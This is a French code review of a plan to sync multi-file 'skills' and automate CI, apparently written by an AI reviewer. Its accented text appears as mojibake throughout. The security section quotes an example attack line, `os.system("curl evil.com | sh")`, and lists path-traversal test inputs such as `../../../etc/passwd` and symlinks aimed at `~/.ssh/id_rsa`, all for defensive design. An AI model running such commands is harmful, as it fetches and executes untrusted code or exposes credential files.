# Revue technique â€” Plan V2 : Skills Sync + CI AutomatisÃ©e

> **Reviewer** : Senior Code Reviewer (AI)
> **Date** : 2026-02-13
> **Scope** : Audit complet du codebase existant + analyse technique du plan en 10 dimensions
> **MÃ©thode** : Lecture exhaustive de tous les fichiers du projet (scripts, CLI, tests, CI, skills existants, manifests)
> **Verdict** : **APPROVE conditionnel â€” 4 risques critiques Ã  rÃ©soudre avant implÃ©mentation**

---

## Verdict

Le plan V2 est **techniquement rÃ©alisable** dans les contraintes du projet (Python stdlib only, zero npm deps, SHA-pinned CI). L'architecture existante est solide et bien testÃ©e (1609 lignes Python, 176 tests verts, gardes de sÃ©curitÃ© matures).

Cependant, le plan **sous-estime 4 problÃ¨mes structurels** qui, non rÃ©solus, produiront soit de la dette technique immÃ©diate, soit des bugs en production :

1. ğŸ”´ **Duplication de ~600 lignes** d'infrastructure HTTP/cache/parse entre `sync-agents.py` et `sync-skills.py`
2. ğŸ”´ **Le download de rÃ©pertoires dans la CLI** nÃ©cessite un refactoring majeur de `installer.mjs` (actuellement single-file only)
3. ğŸ”´ **Le calcul de rate limiting est faux** (2000+ appels rÃ©els vs 936 estimÃ©s)
4. ğŸ”´ **Surface de sÃ©curitÃ© Ã©largie** par les fichiers compagnons `scripts/` (exÃ©cutables potentiels)

Le reste du plan est solide. Les 6 autres dimensions analysÃ©es montrent des risques moyens ou bas, gÃ©rables avec les mitigations proposÃ©es.

---

## 1. Architecture â€” `sync-skills.py` sÃ©parÃ© vs extension de `sync-agents.py`

### Ã‰valuation

La dÃ©cision D3 de crÃ©er un script sÃ©parÃ© est **correcte sur le fond** (skills = rÃ©pertoires multi-fichiers â‰  agents = fichiers uniques), mais **incomplÃ¨te sur la forme** : elle ne traite pas le problÃ¨me de l'infrastructure partagÃ©e.

### Inventaire du code rÃ©utilisable dans `sync-agents.py`

| Fonction / Classe | Lignes | RÃ´le | RÃ©utilisable ? |
|---|---|---|---|
| `SafeRedirectHandler` (L53-69) | 17 | Bloque les redirections cross-origin | âœ… Identique |
| `_get_headers()` (L311-320) | 10 | Headers HTTP + auth token | âœ… Identique |
| `_http_request()` (L327-431) | 105 | Retry, backoff, rate-limit, 304 | âœ… Identique |
| `_api_get()` (L434-445) | 12 | GET JSON avec retry | âœ… Identique |
| `_raw_get()` (L448-466) | 19 | GET text avec cap 1MB | âœ… Identique |
| `_cached_get()` (L515-574) | 60 | ETag/If-Modified-Since | âœ… Adaptable |
| `check_rate_limit()` (L577-587) | 11 | VÃ©rification rate limit API | âœ… Identique |
| `parse_frontmatter()` (L595-646) | 52 | Parse YAML stdlib | âœ… Identique |
| `_load_sync_cache()` / `_save_sync_cache()` (L476-501) | 26 | Persistence cache | âœ… Identique |
| `_is_synced_agent()` / `clean_synced_agents()` (L1006-1080) | 75 | DÃ©tection/nettoyage synced files | âœ… Adaptable (`_is_synced_skill()`) |
| `_yaml_serialize_permission()` (L844-875) | 32 | SÃ©rialisation YAML | ğŸŸ¡ Partielle |
| Path traversal guards (L1174-1184) | 11 | SÃ©curitÃ© chemins | âœ… Identique |
| **Total rÃ©utilisable** | **~430 lignes** | | |

### Risques

- ğŸ”´ **CRITIQUE â€” Duplication massive** : Sans extraction, `sync-skills.py` dupliquera ~430 lignes de code identique. Toute correction de bug (ex: nouveau comportement rate-limit de l'API GitHub) devra Ãªtre appliquÃ©e dans les deux fichiers.
- ğŸŸ¡ **MOYEN â€” Divergence progressive** : MÃªme avec une intention de garder les deux scripts alignÃ©s, l'expÃ©rience montre que les copies divergent rapidement. Un fix dans `_http_request()` de `sync-agents.py` sera oubliÃ© dans `sync-skills.py`.

### Mitigations

**Option A (recommandÃ©e) â€” Module partagÃ© `scripts/sync_common.py`** :
```
scripts/
  sync_common.py    # ~430 lignes : HTTP, cache, parse, sÃ©curitÃ©
  sync-agents.py    # ~1180 lignes : logique agents uniquement
  sync-skills.py    # ~600-800 lignes : logique skills uniquement
```

- Avantage : DRY, un seul endroit pour les corrections
- Contrainte : Python stdlib only âœ… (pas besoin d'install, import relatif suffit)
- Impact CI : Ajouter `python3 -c "import ast; ast.parse(open('scripts/sync_common.py').read())"` au job lint (L66 de `ci.yml`)
- Impact tests : Les 117 tests existants de `test_sync_script.py` qui mockent `_http_request`, `_api_get`, etc. devront Ãªtre adaptÃ©s pour importer depuis `sync_common`

**Option B â€” Copier-coller conscient** :
- Acceptable uniquement si le projet reste Ã  2 personnes max et si un lint CI vÃ©rifie la concordance des fonctions partagÃ©es
- Non recommandÃ©e pour un projet open-source

### Recommandation

**Extraire `sync_common.py` AVANT de commencer T4.1.** Le refactoring de `sync-agents.py` est un prÃ©-requis, pas un nice-to-have. Estimation : 1-2 sessions (incluant l'adaptation des 117 tests).

---

## 2. FaisabilitÃ© â€” Contrainte stdlib only

### Ã‰valuation

Le plan est **entiÃ¨rement rÃ©alisable avec la stdlib Python 3.10+** et **zÃ©ro npm deps**. L'Ã©quipe a dÃ©jÃ  prouvÃ© cette capacitÃ© avec `sync-agents.py`.

### Analyse par composant

| Besoin skills | Solution stdlib | DÃ©jÃ  implÃ©mentÃ© ? | ComplexitÃ© |
|---|---|---|---|
| HTTP GET avec retry/backoff | `urllib.request` + `_http_request()` | âœ… L327-431 | RÃ©solue |
| Parse YAML frontmatter | Regex custom `parse_frontmatter()` | âœ… L595-646 | RÃ©solue |
| Recursive tree API | `_api_get()` + JSON parse | âœ… L434-445 | RÃ©solue |
| Download fichiers binaires (CSV) | `_raw_get()` â†’ `bytes` | ğŸŸ¡ Partiel â€” `_raw_get()` dÃ©code en UTF-8 (L466) | Simple Ã  adapter |
| Copie rÃ©cursive de rÃ©pertoires | `pathlib.Path.mkdir(parents=True)` + `write_text/write_bytes` | âœ… Pattern existant L1219 | Triviale |
| RÃ©Ã©criture de chemins dans le body | `str.replace()` / `re.sub()` | âœ… Pattern existant `clean_body()` L801 | Simple |
| GÃ©nÃ©ration JSON manifest | `json.dumps()` | âœ… `write_manifest()` L1236 | RÃ©solue |
| Hash SHA256 pour cache | `hashlib.sha256()` | âœ… L572 | RÃ©solue |
| ETag/If-Modified-Since | `_cached_get()` | âœ… L515-574 | RÃ©solue |

### Risques

- ğŸŸ¡ **MOYEN â€” Fichiers binaires** : `_raw_get()` (L466) fait un `.decode("utf-8")` systÃ©matique. Les fichiers compagnons comme `techniques.csv` (prÃ©sent dans brainstormai) sont du texte, mais d'autres skills pourraient contenir des binaires (images, archives). Il faut un `_raw_get_bytes()` qui retourne des `bytes` sans dÃ©codage.

- ğŸŸ¢ **BAS â€” Parse YAML nested** : Le `parse_frontmatter()` existant (L595-646) gÃ¨re uniquement les paires `clÃ©: valeur` simples. Les skills hand-written comme `browser-mcp` et `memory` ont du YAML nested (`metadata:\n  mcp-server: ...\n  version: ...`). Le parser ignore silencieusement ces lignes indentÃ©es (L628-631 : `if match:` ne matche pas les lignes indentÃ©es, elles deviennent des continuations). Ce n'est pas un bug pour le cas d'usage actuel (le plan supprime tous les champs sauf `name` et `description`), mais c'est une limitation documentÃ©e.

### Mitigations

1. Ajouter une variante `_raw_get_bytes()` ou un paramÃ¨tre `decode=True|False` Ã  `_raw_get()` :
```python
def _raw_get(url, *, retries=3, backoff=1.0, decode=True):
    # ... existing code ...
    if decode:
        return body.decode("utf-8")
    return body
```

2. Documenter la limitation du parser YAML dans le header de `parse_frontmatter()` : "Ne supporte que les paires clÃ©-valeur simples. Le YAML nested est ignorÃ©."

---

## 3. SystÃ¨me de scoring

### Ã‰valuation

Le scoring 5-facteurs pondÃ©rÃ© (T4.2) est **conceptuellement intÃ©ressant mais opÃ©rationnellement impraticable** pour un premier lancement. La product review (03-product-review-v2.md) a dÃ©jÃ  bien couvert ce point. Je confirme du point de vue technique.

### Risques

- ğŸŸ  **HAUT â€” Pas de source de donnÃ©es automatisable** : Les 5 facteurs sont tous subjectifs. Le score dÃ©pend d'un humain qui lit 686 SKILL.md et attribue des notes. Aucune API, aucune mÃ©trique automatique ne peut alimenter ce systÃ¨me pour le v1.

- ğŸŸ¡ **MOYEN â€” ReproductibilitÃ©** : Deux Ã©valuateurs diffÃ©rents produiraient des tiers diffÃ©rents. Le scoring n'est pas dÃ©terministe.

- ğŸŸ¢ **BAS â€” ComplexitÃ© de code** : Le scoring lui-mÃªme est trivial Ã  implÃ©menter (~30 lignes de Python). Le problÃ¨me n'est pas technique, c'est opÃ©rationnel.

### Mitigations

Je m'aligne avec la recommandation R1 de la product review : **reporter le scoring Ã  Phase 7** et commencer avec une `CURATED_SKILLS` list manuelle (mÃªme pattern que `CURATED_AGENTS` dans `sync-agents.py`, L120-175).

Pour le v1, le Â« scoring Â» se rÃ©sume Ã  :
```python
CURATED_SKILLS: Dict[str, str] = {
    "clean-code": "development/clean-code",
    "api-design": "architecture/api-design",
    # ... 10-15 skills hand-picked
}
```

Ce pattern est prouvÃ© â€” il fonctionne exactement ainsi pour les 43 agents core.

---

## 4. Pipeline CI â€” `sync.yml`

### Ã‰valuation

L'architecture proposÃ©e (detect â†’ sync-agents âˆ¥ sync-skills â†’ validate â†’ create-pr) est **bien conÃ§ue**. Le choix de `peter-evans/create-pull-request` SHA-pinned est correct (cohÃ©rent avec la politique SHA existante en `ci.yml`, L25/L27/L44/L55-57).

### Risques

- ğŸŸ  **HAUT â€” Race condition sur branche fixe** : Le plan utilise une branche fixe `sync/upstream-auto`. Si un sync prÃ©cÃ©dent a crÃ©Ã© une PR non mergÃ©e, le prochain sync modifie la mÃªme branche. `peter-evans/create-pull-request` gÃ¨re ce cas (il force-push la branche), mais :
  - Si un reviewer a laissÃ© des commentaires sur la PR prÃ©cÃ©dente, ils sont perdus dans le diff
  - Si un commit manuel a Ã©tÃ© ajoutÃ© Ã  la branche de PR (ex: fix d'un frontmatter), il sera Ã©crasÃ© par le force-push

- ğŸŸ¡ **MOYEN â€” ParallÃ©lisme agents/skills** : Les jobs `sync-agents` et `sync-skills` sont marquÃ©s parallÃ¨les dans le plan. Mais ils Ã©crivent tous les deux dans le mÃªme workspace Git. GitHub Actions ne partage pas l'Ã©tat du filesystem entre jobs â€” chaque job a un checkout frais. Solution : utiliser des artifacts ou un seul job sÃ©quentiel.

- ğŸŸ¡ **MOYEN â€” Permissions GitHub Token** : Le plan demande `contents:write` + `pull-requests:write`. Le CI actuel (L9-10 de `ci.yml`) n'a que `contents: read`. Le nouveau workflow aura besoin de permissions Ã©largies, ce qui est attendu mais doit Ãªtre explicitement scopÃ© au workflow `sync.yml` (pas au niveau du repo).

- ğŸŸ¢ **BAS â€” Cron drift** : GitHub Actions ne garantit pas l'exÃ©cution exacte du cron (dÃ©calage de 15-60 min). Non bloquant mais Ã  documenter.

### Mitigations

1. **Race condition** : Ajouter un label `auto-sync` aux PR crÃ©Ã©es. Avant de crÃ©er une nouvelle PR, vÃ©rifier si une PR avec ce label est ouverte et la fermer avec un commentaire explicatif. Ou mieux : mettre Ã  jour la PR existante (c'est le comportement par dÃ©faut de `peter-evans/create-pull-request` avec `branch: sync/upstream-auto`).

2. **ParallÃ©lisme** : Utiliser un seul job `sync` qui exÃ©cute sÃ©quentiellement `sync-agents.py` puis `sync-skills.py`, plutÃ´t que deux jobs parallÃ¨les. Le gain de temps du parallÃ©lisme (~2-3 min) ne justifie pas la complexitÃ© des artifacts. Alternative : utiliser `actions/upload-artifact` / `actions/download-artifact` SHA-pinned pour partager le workspace.

3. **Permissions** : DÃ©clarer les permissions au niveau du workflow, pas du job :
```yaml
# sync.yml
permissions:
  contents: write
  pull-requests: write
```

---

## 5. Rate limiting

### Ã‰valuation

L'estimation du plan (T5.3) de ~936 appels API est **significativement sous-Ã©valuÃ©e**.

### Calcul rÃ©el

| OpÃ©ration | Appels API | Source |
|---|---|---|
| Tree API recursive (detect) | 1 | `/git/trees/main?recursive=1` |
| **Agents sync** | | |
| - Contents API par catÃ©gorie (~15 catÃ©gories) | ~15 | `/repos/.../contents/` (pour `--all` mode) |
| - Raw download par agent (~130 extended) | ~130 | `raw.githubusercontent.com` (ne compte PAS contre le rate limit API) |
| **Skills sync** | | |
| - Tree API (1 appel rÃ©cursif) | 1 | DÃ©jÃ  comptÃ© ci-dessus |
| - Raw download SKILL.md (~25-120 skills) | 25-120 | `raw.githubusercontent.com` (hors rate limit) |
| - Raw download fichiers compagnons | **?** | Estimation ci-dessous |
| Rate limit check | 1 | `/rate_limit` |
| **Total appels API GitHub** | **~18** | Bien en dessous de 5000/hr |
| **Total raw downloads** | **155-250+** | Hors rate limit mais throttled |

### Le vrai problÃ¨me : throttling de `raw.githubusercontent.com`

- ğŸ”´ **CRITIQUE â€” L'estimation de 936 appels mÃ©lange deux systÃ¨mes distincts** :
  - Les appels Ã  `api.github.com` (rate limited Ã  5000/hr avec token, 60/hr sans)
  - Les downloads via `raw.githubusercontent.com` (PAS rate limited par l'API, mais avec un throttling non documentÃ© qui retourne des 429 aprÃ¨s ~100 requÃªtes/minute)

- Le code existant gÃ¨re dÃ©jÃ  les 429 via `_http_request()` (L376-397) avec `Retry-After` et `X-RateLimit-Reset`. Mais le throttling de `raw.githubusercontent.com` ne renvoie PAS ces headers â€” il retourne un 429 sec sans `Retry-After`.

### Risques

- ğŸ”´ **CRITIQUE â€” Throttling silencieux** : Pour un sync complet de 120+ skills avec fichiers compagnons (~300+ downloads raw), le throttling de `raw.githubusercontent.com` provoquera des erreurs 429 sans header de retry. Le code actuel (`_http_request()` L376-397) gÃ¨re le `Retry-After` header, mais pas l'absence de ce header sur un 429.

- ğŸŸ¡ **MOYEN â€” Polite delay insuffisant** : Le dÃ©lai actuel entre agents est `time.sleep(0.3)` (L1575 de `sync-agents.py`). Pour les skills avec fichiers compagnons (rafale de 3-10 downloads par skill), ce dÃ©lai inter-skill ne suffit pas.

### Mitigations

1. **Ajouter un fallback pour 429 sans Retry-After** dans `_http_request()` :
```python
# L376-397 de sync-agents.py â€” aprÃ¨s le check Retry-After/X-RateLimit-Reset
if exc.code in (403, 429):
    retry_after = exc.headers.get("Retry-After")
    reset = exc.headers.get("X-RateLimit-Reset")
    if retry_after:
        wait = int(retry_after)
        # ... existing code ...
    elif reset:
        # ... existing code ...
    else:
        # Fallback: exponential backoff pour 429 sans headers
        wait = backoff * (2 ** (attempt - 1)) * 5  # 5s, 10s, 20s
        logger.warning("  [rate-limit] No Retry-After header on %d, waiting %ds...", exc.code, wait)
        time.sleep(wait)
        continue
```

2. **Ajouter un dÃ©lai inter-fichier** pour les downloads de fichiers compagnons (0.2-0.5s entre chaque fichier dans un skill).

3. **Utiliser l'API Git blobs** au lieu de raw downloads pour les fichiers compagnons : `/repos/{owner}/{repo}/git/blobs/{sha}`. Ceci utilise le rate limit API (5000/hr) mais est plus prÃ©visible.

---

## 6. Download directory â€” Refactoring CLI

### Ã‰valuation

C'est le **plus gros dÃ©fi technique du plan** cÃ´tÃ© Node.js. L'`installer.mjs` actuel (212 lignes) est conÃ§u exclusivement pour des fichiers uniques. L'adapter aux rÃ©pertoires de skills nÃ©cessite un refactoring structurel.

### Ã‰tat actuel de `installer.mjs`

```
download(url) â†’ Promise<string>              # Un seul fichier, retour texte
  â†“
getDestination(agent, cwd) â†’ {absolute, relative}  # Un seul chemin .md
  â†“
writeFileSync(dest.absolute, content, 'utf-8')       # Ã‰criture unique
```

### Ce qu'il faut pour les skills

```
downloadSkillTree(skill) â†’ Promise<{path: string, content: Buffer}[]>
  â†“
  â”œâ”€â”€ Lister les fichiers (tree API ou manifest)
  â”œâ”€â”€ TÃ©lÃ©charger N fichiers en parallÃ¨le (avec concurrency limit)
  â”œâ”€â”€ GÃ©rer texte ET binaire (CSV, etc.)
  â””â”€â”€ CrÃ©er la structure de rÃ©pertoires
  â†“
getSkillDestination(skill, cwd) â†’ {baseDir, files[]}
  â†“
Pour chaque fichier :
  mkdirSync(dirname, {recursive: true})
  writeFileSync(path, content)  # 'utf-8' ou buffer selon le type
```

### Risques

- ğŸ”´ **CRITIQUE â€” Refactoring non trivial** : Le plan (T6.2) sous-estime la complexitÃ©. Ce n'est pas "ajouter une option" â€” c'est crÃ©er un second chemin d'installation complet avec :
  - Ã‰numÃ©ration de fichiers (comment lister le contenu d'un skill sans API cÃ´tÃ© serveur ?)
  - Download concurrent (le `for...of` sÃ©quentiel actuel L204-207 ne scale pas pour 28 fichiers)
  - Gestion binaire (`download()` L84 fait `.toString('utf-8')` â€” cassera les fichiers non-texte)
  - Path traversal sur les sous-rÃ©pertoires (le guard existant L119-124 ne couvre qu'un seul niveau)

- ğŸŸ  **HAUT â€” Comment lister les fichiers d'un skill ?** : Le `manifest.json` actuel contient un `path` par agent. Le `skills-manifest.json` devra contenir la liste complÃ¨te des fichiers de chaque skill (`companion_files` dans le schema T4.4). Mais qui gÃ©nÃ¨re cette liste ? Le script Python cÃ´tÃ© sync. Donc le CLI dÃ©pend Ã  100% de la complÃ©tude du manifest.

- ğŸŸ¡ **MOYEN â€” Pas de test d'intÃ©gration** : Les 59 tests CLI actuels (`cli.test.mjs`, 642 lignes) mockent tous les downloads. Il n'y a aucun test d'intÃ©gration qui vÃ©rifie que la structure de rÃ©pertoires crÃ©Ã©e est correcte.

### Mitigations

1. **Enrichir `skills-manifest.json` avec la liste exhaustive des fichiers** :
```json
{
  "name": "brainstormai",
  "files": [
    {"path": "SKILL.md", "size": 4521, "sha": "abc123"},
    {"path": "agents/analyst.agent.md", "size": 890, "sha": "def456"},
    {"path": "workflows/brainstorm/data/techniques.csv", "size": 2100, "sha": "ghi789"}
  ]
}
```
Ainsi la CLI n'a pas besoin d'appeler l'API tree â€” elle itÃ¨re sur la liste du manifest.

2. **CrÃ©er une fonction `downloadBinary(url)`** sÃ©parÃ©e de `download(url)` qui retourne un `Buffer` au lieu d'un `string` :
```javascript
function downloadBinary(url, _redirectCount = 0) {
  // ... same as download() but return Buffer.concat(chunks) without .toString()
}
```

3. **Ajouter des guards de path traversal rÃ©cursifs** dans le nouveau `getSkillDestination()` :
```javascript
for (const file of skill.files) {
  const filePath = resolve(skillDir, file.path);
  if (!filePath.startsWith(skillDir + sep)) {
    throw new Error(`Security: path "${file.path}" escapes skill directory`);
  }
}
```

4. **Limiter la concurrence des downloads** avec un pool simple (stdlib, pas de npm dep) :
```javascript
async function downloadPool(urls, concurrency = 3) {
  const results = [];
  for (let i = 0; i < urls.length; i += concurrency) {
    const batch = urls.slice(i, i + concurrency);
    results.push(...await Promise.all(batch.map(download)));
  }
  return results;
}
```

---

## 7. Breaking changes

### Ã‰valuation

Le plan est **bien conÃ§u pour Ã©viter les breaking changes**. La sÃ©paration skills/agents (D1) et le rÃ©pertoire distinct (`.opencode/skills/` vs `.opencode/agents/`) garantissent l'isolation.

### Risques

- ğŸŸ¡ **MOYEN â€” Inflation du manifest.json** : Le plan crÃ©e un `skills-manifest.json` sÃ©parÃ©. Mais `registry.mjs` (L87-101) charge et cache uniquement `manifest.json`. Si la CLI doit supporter les deux, `loadManifest()` devra Ãªtre modifiÃ© ou un `loadSkillsManifest()` parallÃ¨le devra Ãªtre crÃ©Ã©. Le type `Manifest` (L36-44 de `registry.mjs`) est fixÃ© (`agents: AgentEntry[]`) â€” il faudra un type `SkillsManifest` sÃ©parÃ©.

- ğŸŸ¡ **MOYEN â€” Collision de noms** : Rien n'empÃªche un agent et un skill d'avoir le mÃªme nom (ex: `code-reviewer` agent + `code-review` skill). La CLI `search` (T6.1) devra distinguer les deux dans ses rÃ©sultats. Le `searchAgents()` actuel (L164-177 de `registry.mjs`) ne cherche que dans `manifest.agents`.

- ğŸŸ¢ **BAS â€” Frontmatter des skills hand-written** : Les 4 skills existants (`brainstormai`, `browser-mcp`, `memory`, `sequential-thinking`) ont des frontmatter inconsistants entre eux. `brainstormai` a seulement `name` + `description`. `browser-mcp`, `memory`, `sequential-thinking` ont en plus `license`, `compatibility`, `metadata` (nested). Le sync ne touchera pas aux hand-written (protection D8), mais le validateur CI devra accepter les deux formats.

### Mitigations

1. CrÃ©er un `loadSkillsManifest()` dans `registry.mjs` (parallÃ¨le Ã  `loadManifest()`) avec un type `SkillEntry` distinct de `AgentEntry`.

2. Ajouter un prÃ©fixe ou un champ `type` aux rÃ©sultats de recherche pour distinguer agents et skills :
```
  [agent] code-reviewer     â€” Code review expert
  [skill] code-review       â€” How to conduct effective code reviews
```

3. Le validateur CI pour les skills doit accepter un sous-ensemble minimal de frontmatter (`name` + `description`) sans rejeter les champs supplÃ©mentaires des hand-written.

---

## 8. StratÃ©gie de tests

### Ã‰valuation

La couverture existante est **excellente** : 117 tests Python + 59 tests CLI = 176 tests, tous verts. Le plan (T4.3, T6.3) prÃ©voit des tests mais manque de dÃ©tails.

### Ã‰tat actuel des tests

| Fichier | Tests | Couverture |
|---|---|---|
| `tests/test_sync_script.py` | 117 | `_http_request`, `_api_get`, `_raw_get`, `_cached_get`, `parse_frontmatter`, `build_permissions`, `clean_body`, `extract_short_description`, `build_opencode_agent`, `clean_synced_agents`, `sync_agent`, `main()` CLI args |
| `tests/test_agents.py` | 516L | Validation des 49 agents (frontmatter, body, fichiers) |
| `tests/cli.test.mjs` | 59 | CLI args, install, list, search, packs, display |
| `tests/run_tests.py` | 117L | Runner de tests Python (unittest) |

### Risques

- ğŸŸ  **HAUT â€” Tests de skills non spÃ©cifiÃ©s** : T4.3 liste 5 types de validation sans dÃ©tailler les cas limites. Les cas critiques non mentionnÃ©s :
  - Skill avec 0 fichiers compagnons (juste SKILL.md)
  - Skill avec 28+ fichiers (comme brainstormai)
  - Skill avec des chemins profondÃ©ment nestÃ©s (`workflows/create-prd/steps/step-07-complete.annexe.md`)
  - Skill avec des caractÃ¨res spÃ©ciaux dans les noms de fichiers
  - Skill avec un SKILL.md vide ou malformÃ©
  - Skill rÃ©fÃ©renÃ§ant un autre skill (`@[skills/other-skill]`)
  - Collision de noms entre skill synced et skill hand-written

- ğŸŸ¡ **MOYEN â€” Pas de test d'intÃ©gration CLI pour skills** : T6.3 mentionne "tests d'installation de skills" mais les tests CLI actuels (`cli.test.mjs`) mockent intÃ©gralement les downloads. Un test d'intÃ©gration rÃ©el (download â†’ write â†’ verify structure) n'existe pas mÃªme pour les agents.

- ğŸŸ¢ **BAS â€” Tests Python portables** : Les tests utilisent `unittest.mock.patch` pour mocker `urllib.request`. Ce pattern fonctionne pour `sync-skills.py` si les fonctions HTTP restent dans le mÃªme module ou sont importÃ©es depuis `sync_common.py`.

### Mitigations

1. **CrÃ©er un jeu de fixtures** reprÃ©sentant les 3 archÃ©types de skills :
   - `simple-skill/` : SKILL.md uniquement (comme `sequential-thinking`)
   - `standard-skill/` : SKILL.md + 2-3 fichiers compagnons
   - `complex-skill/` : SKILL.md + rÃ©pertoires nestÃ©s (simulant brainstormai)

2. **Tests de path traversal spÃ©cifiques aux skills** : vÃ©rifier que des chemins malicieux dans les fichiers compagnons (`../../../etc/passwd`, `scripts/../../malicious.sh`) sont rejetÃ©s.

3. **Test de round-trip** : sync un skill â†’ l'installer via CLI â†’ vÃ©rifier que la structure sur disque correspond au manifest.

4. **Adapter `tests/test_agents.py` en `tests/test_skills.py`** : le pattern de validation des agents (lecture de tous les .md dans un rÃ©pertoire, vÃ©rification du frontmatter) s'applique directement aux skills.

---

## 9. SÃ©curitÃ©

### Ã‰valuation

L'infrastructure de sÃ©curitÃ© existante est **mature et bien pensÃ©e**. Les deux stacks (Python et Node.js) ont des gardes cohÃ©rentes. Cependant, les skills avec fichiers compagnons **Ã©largissent significativement la surface d'attaque**.

### Gardes de sÃ©curitÃ© existantes

| Garde | Python (`sync-agents.py`) | Node.js (`installer.mjs` + `registry.mjs`) |
|---|---|---|
| Path traversal | `resolved_out.startswith(resolved_base + "/")` (L1178) | `absolute.startsWith(safeBase + sep)` (L122) |
| Cross-origin redirect | `SafeRedirectHandler` (L53-69) | VÃ©rification `ALLOWED_HOSTS` (L54) |
| Download size cap | `max_read_bytes=1_048_576` (L461) | `MAX_RESPONSE_SIZE = 1024 * 1024` (L23) |
| Name validation | `".." in agent_name or "/" in agent_name` (L988) | `SAFE_NAME_RE = /^[a-z0-9][a-z0-9._-]*$/i` (L56) |
| Manifest validation | N/A (manifest gÃ©nÃ©rÃ©, pas consommÃ©) | `validateManifest()` : `base_path`, noms, chemins (L62-81) |
| Auth token protection | `SafeRedirectHandler` bloque les redirects cross-origin | N/A (pas de token cÃ´tÃ© CLI) |
| HTTPS only | Implicite (URLs hardcodÃ©es) | `parsed.protocol !== 'https:'` check (L50) |

### Risques â€” Nouvelles surfaces d'attaque

- ğŸ”´ **CRITIQUE â€” Fichiers compagnons `scripts/`** : Le plan prÃ©voit de copier des fichiers `scripts/*.py` depuis le repo upstream. Si un skill contient un script malicieux, il sera installÃ© dans `.opencode/skills/{name}/scripts/` et potentiellement exÃ©cutable. Contrairement aux fichiers `.md` (qui sont du contenu passif), les scripts sont du code actif.

  **Vecteur d'attaque** : Un contributeur upstream ajoute un skill avec un `scripts/setup.py` contenant `os.system("curl evil.com | sh")`. Le sync le copie. Un utilisateur ou un agent IA l'exÃ©cute.

- ğŸŸ  **HAUT â€” Path traversal multiplicatif** : Avec les agents, le path traversal est limitÃ© Ã  un seul fichier par agent (`{name}.md`). Avec les skills, chaque skill peut avoir N fichiers compagnons, chacun avec un chemin potentiellement malicieux. Le guard existant (Python L1178, Node L122) vÃ©rifie un chemin Ã  la fois â€” il doit Ãªtre appliquÃ© Ã  **chaque** fichier compagnon.

- ğŸŸ¡ **MOYEN â€” Symlinks** : Le repo upstream pourrait contenir des symlinks dans la structure de fichiers d'un skill. `pathlib.Path.write_text()` suit les symlinks â€” un symlink malicieux pourrait pointer vers `/etc/passwd` ou `~/.ssh/id_rsa`. Le code actuel n'a pas de check anti-symlink car les agents sont des fichiers uniques tÃ©lÃ©chargÃ©s (pas copiÃ©s localement).

- ğŸŸ¡ **MOYEN â€” Taille cumulÃ©e** : Le cap actuel est de 1MB par fichier (`MAX_RESPONSE_SIZE`). Mais un skill avec 28 fichiers de 1MB chacun = 28MB. Il n'y a pas de cap sur la taille totale d'un skill.

### Mitigations

1. **Interdire l'exÃ©cution directe des scripts compagnons** â€” ajouter un commentaire de warning en tÃªte de chaque script copiÃ© :
```python
# WARNING: This script was synced from an external source.
# Review before execution. Do not run untrusted code.
```
Mieux encore : renommer les `.py` en `.py.txt` ou les placer dans un sous-rÃ©pertoire `reference/` pour dÃ©courager l'exÃ©cution.

2. **Appliquer le path traversal guard Ã  chaque fichier compagnon** :
```python
for companion_path in skill_files:
    resolved = (skill_dir / companion_path).resolve()
    if not str(resolved).startswith(str(skill_dir.resolve()) + "/"):
        raise ValueError(f"[SECURITY] Path traversal in companion file: {companion_path}")
```

3. **Valider les noms de fichiers compagnons** avec une regex stricte :
```python
SAFE_COMPANION_RE = re.compile(r'^[a-zA-Z0-9][a-zA-Z0-9._/-]*$')
if not SAFE_COMPANION_RE.match(companion_path):
    logger.warning("[SECURITY] Rejecting unsafe companion path: %s", companion_path)
    continue
```

4. **VÃ©rifier l'absence de symlinks** :
```python
if out_path.is_symlink():
    raise ValueError(f"[SECURITY] Symlink detected at {out_path}")
```

5. **Ajouter un cap de taille totale par skill** (ex: 5MB max cumulÃ©) :
```python
MAX_SKILL_TOTAL_SIZE = 5 * 1024 * 1024  # 5 MB
total = sum(len(content) for content in files.values())
if total > MAX_SKILL_TOTAL_SIZE:
    raise ValueError(f"Skill {name} exceeds size limit: {total} bytes")
```

---

## 10. Dette technique

### Ã‰valuation

Le codebase actuel est **Ã©tonnamment propre** pour un projet de cette taille. La dette technique est faible. Cependant, le plan V2 introduira de la nouvelle dette si certaines dÃ©cisions ne sont pas prises en amont.

### Dette existante (hÃ©ritÃ©e)

| Item | SÃ©vÃ©ritÃ© | Localisation | Impact |
|---|---|---|---|
| `parse_frontmatter()` ne gÃ¨re pas le YAML nested | ğŸŸ¢ Bas | L595-646 | Non bloquant : le plan supprime les champs nested |
| `_opener` est un global mutable | ğŸŸ¢ Bas | L72 | Non thread-safe, mais les scripts sont single-threaded |
| `CATEGORY_MAPPING` hardcodÃ© | ğŸŸ¢ Bas | L85-114 | Doit Ãªtre Ã©tendu manuellement pour chaque nouvelle catÃ©gorie upstream |
| Pas de type checking (mypy) | ğŸŸ¢ Bas | Global | Les type hints sont prÃ©sents mais non vÃ©rifiÃ©s |

### Nouvelle dette potentielle (Plan V2)

| Item | SÃ©vÃ©ritÃ© | Condition | PrÃ©vention |
|---|---|---|---|
| Duplication sync-agents.py / sync-skills.py | ğŸ”´ Critique | Si pas d'extraction `sync_common.py` | Extraire AVANT T4.1 |
| Deux manifests (`manifest.json` + `skills-manifest.json`) avec schÃ©mas diffÃ©rents | ğŸŸ¡ Moyen | InÃ©vitable (schemas diffÃ©rents) | Documenter les deux formats, versionner les schemas |
| Deux validateurs CI (agents + skills) avec logique similaire | ğŸŸ¡ Moyen | Si copier-coller du validateur L78-125 de `ci.yml` | Extraire le validateur dans un script Python partagÃ© |
| `registry.mjs` avec deux systÃ¨mes de cache (`_cached` pour agents, `_cachedSkills` pour skills) | ğŸŸ¡ Moyen | Si pattern copiÃ© | CrÃ©er une abstraction `loadJsonManifest(path)` gÃ©nÃ©rique |
| `installer.mjs` avec deux chemins d'installation (`installAgent` + `installSkill`) | ğŸŸ¡ Moyen | InÃ©vitable (logiques diffÃ©rentes) | Bien sÃ©parer et documenter les deux chemins |

### MÃ©triques de maintenance

| MÃ©trique | Avant Plan V2 | AprÃ¨s Plan V2 (estimÃ©) |
|---|---|---|
| Lignes Python (scripts/) | ~1609 | ~2800-3200 (avec sync_common.py + sync-skills.py) |
| Lignes Node.js (src/ + bin/) | ~1008 | ~1400-1600 (installer skills + registry skills) |
